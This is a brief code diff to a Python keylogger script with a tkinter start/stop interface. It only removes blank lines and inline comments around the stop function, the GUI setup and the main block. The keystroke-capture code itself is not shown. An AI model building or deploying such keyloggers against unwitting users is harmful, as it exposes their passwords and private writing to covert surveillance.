@@ -99,7 +99,6 @@ def stop_keylogger():
         listener = None
         print("Keylogger stopped.")
 
-
 # GUI Setup
 def create_gui():
     """Creates the tkinter GUI with start/stop buttons."""
@@ -115,7 +114,6 @@ def create_gui():
 
     window.mainloop()
 
-
 if __name__ == "__main__":
-    clear_file()  # Clears the log file at the start
-    start_keylogger() # Start the GUI
+    clear_file()
+    start_keylogger()
